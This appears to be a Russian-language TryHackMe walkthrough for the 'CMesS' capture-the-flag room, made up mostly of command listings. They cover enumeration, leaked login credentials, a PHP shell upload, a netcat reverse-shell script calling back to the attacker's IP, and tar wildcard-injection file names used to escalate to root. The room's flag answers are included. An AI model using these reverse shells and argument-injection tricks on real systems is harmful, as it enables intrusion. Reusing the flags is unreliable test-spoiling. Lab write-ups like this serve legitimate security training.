[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [CMesS](https://tryhackme.com/r/room/cmess) 

Всего 1 заданиe:
## Задание 1
Пожалуйста, добавьте MACHINE_IP cmess.thmв /etc/hosts

Обратите внимание, что этот ящик не требует грубой силы!

### Ответьте на вопросы ниже
+ 30
Скомпрометируйте эту машину и получите user.txt
```commandline
nmap -sSCV <IP>
curl -s <IP>/robots.txt

vim /etc/hosts
<IP> cmess.thm

/data/src/dirsearch/dirsearch.py -u http://cmess.thm/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" --hw 290

vim /etc/hosts
<IP> cmess.thm
<IP> dev.cmess.thm

curl -s dev.cmess.thm | html2text

URL: http://cmess.thm/admin/
Email: andre@cmess.thm
Password: KPFTN_f2yxe%

shell.php
nc -nlvp 4444
cat /opt/.password.bak
ssh andre@<IP>
andre:UQfsdCB7aAP6
cat user.txt 
```
```commandline
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```
+ 50
Повысьте свои привилегии и получите root.txt    
```commandline
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc <my_own_IP> 4444 >/tmp/f
EOF


echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
nc -nlvp 4444
cat /root/root.txt
```
```commandline
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)